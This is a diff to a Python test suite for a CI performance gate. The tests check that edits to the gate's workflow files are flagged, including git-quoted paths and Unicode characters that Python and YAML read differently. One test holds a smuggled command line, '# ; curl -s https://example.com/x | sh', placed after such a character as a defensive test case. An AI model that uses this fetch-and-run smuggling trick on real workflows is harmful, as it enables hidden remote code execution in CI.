@@ -12,7 +12,10 @@ by this tree -- the reading of a profile's calls into the allocator, of a
 run's heap tally, of the base's workloads, of PERF_ACCEPTED as data, never
 run; which changes are counted, and the gate's own files a change edits,
 the workflow read as YAML reads it (its comments aside, never a scalar's
-`#` or blank line) and named wherever it reaches the gate's jobs; the I/O
+`#` or blank line; its lines ended where YAML's end, and every edit of one
+holding a character Python reads as a break or a space and YAML does not
+named) and named wherever it reaches the gate's jobs, the paths a change
+touches read as git stores them, never quoted; the I/O
 counts -- one fsync more a write fails, an entry the pull request
 adds lets it through, one the base holds does not, a drop fails as a rise
 does, a sync swapped for another call fails by its call, a workload only
@@ -2715,6 +2718,113 @@ class Edits(unittest.TestCase):
         head = self.commit({gate.WORKFLOW: text.replace("&runner ubuntu-latest", "&runner self-hosted")})
         notes = gate.gate_edits(mid, head)
         self.assertTrue(any("reads a YAML alias (`*runner`)" in n for n in notes), notes)
+
+    # A workflow's job named so, in a file whose name git quotes without `-z`.
+    NAMED = "name: x\non:\n  pull_request:\njobs:\n  j:\n    name: perf (count)\n    runs-on: ubuntu-latest\n" \
+            "    steps:\n      - run: 'true'\n"
+
+    def test_a_path_is_read_as_git_stores_it(self):
+        # Without `-z`, git quoted a path holding a byte past ASCII or a `"`
+        # (`".github/workflows/\303\274.yml"`), which no test of a prefix
+        # read as a workflow or a local action's: neither was named.
+        for path in (".github/workflows/ü.yml", '.github/workflows/a"b.yml'):
+            with self.subTest(path):
+                self.sh("reset", "-q", "--hard", self.base)
+                notes = gate.gate_edits(self.base, self.commit({path: self.NAMED}))
+                self.assertEqual(notes, [f"`{path}` is edited, and its job `j` is named as one of the gate's "
+                                         "(perf, perf (count), perf (instructions), perf-count): a check shown under "
+                                         "the gate's name, which the owner approves"])
+        self.sh("reset", "-q", "--hard", self.base)
+        action = ".github/actions/ü"
+        mid = self.commit({
+            gate.WORKFLOW: CI.replace("      - run: python3 tools/perf_gate.py run",
+                                      f"      - uses: ./{action}\n      - run: python3 tools/perf_gate.py run"),
+            f"{action}/action.yml": "runs:\n  using: composite\n",
+        })
+        notes = gate.gate_edits(mid, self.commit({f"{action}/action.yml": "runs:\n  using: composite\n  steps: []\n"}))
+        self.assertEqual(notes, [f"`./{action}`, which a job of the gate's uses, is edited (`{action}/action.yml`): "
+                                 "the gate's own, which the owner approves"])
+        # A name that is not UTF-8 is kept, its bytes handed back to git
+        # and said escaped: never dropped. Committed from the index, as a
+        # file system may refuse the name (macOS's does).
+        self.sh("reset", "-q", "--hard", self.base)
+        blob = subprocess.run(["git", "hash-object", "-w", "--stdin"], cwd=self.dir.name, input=self.NAMED.encode(),
+                              capture_output=True, check=True).stdout.strip()
+        subprocess.run(["git", "update-index", "--add", "--cacheinfo",
+                        b"100644," + blob + b",.github/workflows/\xff\n.yml"], cwd=self.dir.name, capture_output=True, check=True)
+        self.sh("-c", "commit.gpgsign=false", "commit", "-q", "-m", "a name that is not UTF-8")
+        self.assertIn(".github/workflows/\udcff\n.yml", gate.diff_paths(self.base, "HEAD"))
+        notes = gate.gate_edits(self.base, self.sh("rev-parse", "HEAD"))
+        self.assertEqual(len(notes), 1, notes)
+        self.assertTrue(notes[0].startswith("`.github/workflows/\\xff\\n.yml` is edited, and its job `j`"), notes)
+        summary = os.path.join(self.dir.name, "summary.md")
+        with contextlib.redirect_stdout(io.StringIO()):
+            self.assertEqual(gate.main(["edits", "--base", self.base, "--head", "HEAD", "--summary", summary]), 0)
+        with open(summary, encoding="utf-8") as f:
+            self.assertIn("- `.github/workflows/\\xff\\n.yml` is edited", f.read())
+
+    def test_a_character_python_breaks_on_and_yaml_does_not_makes_every_edit_the_gates(self):
+        # `str.splitlines` broke a line at each of eight characters YAML 1.2
+        # reads as the line's own: a `# ...` after one, appended to a line
+        # of perf-count's script, was read as a comment on a line of its
+        # own and the edit named by nothing. Lines now end where YAML's do,
+        # and where a workflow holds one of the eight, or another character
+        # Python takes for a space and YAML does not, its every edit is
+        # named, as where it reads an alias: readers of YAML differ there.
+        everything = "".join(map(chr, range(0x110000)))
+        breaks = {p[-1] for p in everything.splitlines(True)[:-1]} - {"\n", "\r"}
+        self.assertEqual(breaks, set("\v\f\x1c\x1d\x1e\x85\u2028\u2029"))
+        unyaml = set(gate.UNYAML.findall(everything))
+        self.assertEqual(unyaml, {c for c in everything if c.isspace()} - set(" \t\r\n"))
+        self.assertLess(breaks, unyaml)
+        with open(os.path.join(os.path.dirname(HERE), gate.WORKFLOW), encoding="utf-8") as f:
+            real = f.read()
+        script = '          echo "the I/O counted by $checker"\n'
+        self.assertIn(script, gate.jobs_of(real)["perf-count"] + "\n")
+        self.assertEqual(gate.UNYAML.findall(real), [])
+        real_base = self.commit({gate.WORKFLOW: real})
+        added = "# ; curl -s https://example.com/x | sh"
+        # The eight on the real ci.yml's script, and three of the other
+        # seventeen, each said by its code point, on a plain line.
+        self.assertEqual(gate.unyaml_said("".join(unyaml)).count("U+"), 25)
+        for c in sorted(breaks | set("\x1f\xa0\u3000")):
+            with self.subTest(f"U+{ord(c):04X}"):
+                if c in breaks:
+                    base, text = real_base, real.replace(script, script[:-1] + c + added + "\n")
+                else:
+                    base, text = self.base, CI.replace("--base HEAD^1\n", "--base HEAD^1" + c + added + "\n")
+                self.sh("reset", "-q", "--hard", base)
+                notes = gate.gate_edits(base, self.commit({gate.WORKFLOW: text}))
+                self.assertIn(f"`{gate.WORKFLOW}` holds U+{ord(c):04X} and is edited: a break or a space to Python "
+                              "and none to YAML, on which readers of YAML differ, so a line one reads as a comment "
+                              "another may run; every edit of it is the gate's, which the owner approves", notes)
+                self.assertIn(f"the `perf-count` job of `{gate.WORKFLOW}` is edited: the gate's own job, which the "
+                              "owner approves", notes)
+                if c not in breaks:
+                    # Alone at a line's end, `rstrip()` took it away: the
+                    # edit was named by nothing.
+                    self.sh("reset", "-q", "--hard", base)
+                    notes = gate.gate_edits(base, self.commit({gate.WORKFLOW: CI.replace("--base HEAD^1\n",
+                                                                                         "--base HEAD^1" + c + "\n")}))
+                    self.assertEqual(len(notes), 1, notes)
+                    self.assertIn(f"holds U+{ord(c):04X} and is edited", notes[0])
+        # Held anywhere in the file, one makes a comment's edit the gate's.
+        self.sh("reset", "-q", "--hard", self.base)
+        mid = self.commit({gate.WORKFLOW: CI.replace("# The judgement.", "# The\u2028judgement.")})
+        notes = gate.gate_edits(mid, self.commit({gate.WORKFLOW: CI.replace("# The judgement.", "# The\u2028judged.")}))
+        self.assertEqual(len(notes), 1, notes)
+        self.assertIn("holds U+2028 and is edited", notes[0])
+        # In another workflow, a job a reader breaking at U+2028 reads and
+        # this one takes for a comment's text is named with its file.
+        self.sh("reset", "-q", "--hard", self.base)
+        other = ".github/workflows/other.yml"
+        mid = self.commit({other: self.NAMED.replace("perf (count)", "lint")})
+        hidden = self.NAMED.replace("perf (count)", "lint") + "  # x\u2028  k:\u2028    name: perf (count)\n"
+        notes = gate.gate_edits(mid, self.commit({other: hidden}))
+        self.assertEqual(notes, [f"`{other}` holds U+2028 and is edited: a break or a space to Python and none to "
+                                 "YAML, on which readers of YAML differ, so a job one reads as a comment another may "
+                                 "show under the gate's name, which the owner approves"])
+        self.assertNotIn("k", gate.workflow_parts(hidden)["jobs"])
 
     def test_the_cli_writes_a_warning_and_the_summary(self):
         head = self.commit({gate.CHECKER: checker([entry()])})
